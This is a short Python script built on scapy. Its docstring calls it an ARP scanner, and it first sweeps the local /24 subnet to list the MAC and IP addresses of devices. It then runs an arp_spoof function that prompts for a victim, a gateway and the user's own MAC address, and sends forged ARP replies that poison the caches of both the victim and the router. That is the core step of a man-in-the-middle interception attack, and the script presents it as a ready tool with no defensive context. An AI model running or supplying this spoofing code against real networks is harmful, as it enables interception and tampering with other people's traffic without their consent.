""" Arp scanner """

from scapy.all import conf
from scapy.all import srp
from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.interfaces import get_if_list
from scapy.layers.l2 import Ether, ARP

# Retrieve MAC address and IP address of devices on the network
def send_arp(interface):
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{cidr_interface_address}"), iface=interface, timeout=2)
    for sent, received in answered:
        mac_src = received.src
        ip_src = received.psrc
        print(f"MAC: {mac_src} IP: {ip_src}")


def arp_spoof():
    victim = input("Enter victim address: ")
    gateway = input("Enter gateway address: ")
    my_mac = input("Enter your MAC address: ")
    poison_victim = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/ARP(op=2, pdst=f"{victim}", psrc=f"{gateway}")
    poison_router = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/ARP(op=2, pdst=f"{gateway}", psrc=f"{victim}")
    srp(poison_victim, timeout=1)
    srp(poison_router, timeout=1)



interfaces_list = conf.ifaces

print(interfaces_list)

interface = input("Interface: ")

interface_address = get_if_addr(interface) # Protocol address for user typed interface
cidr = "/24" # Append this to protocol address
join_list = [interface_address, cidr]
cidr_interface_address = "".join(join_list) # Join protocol address and CIDR to create address range for send_arp

send_arp(interface)

arp_spoof()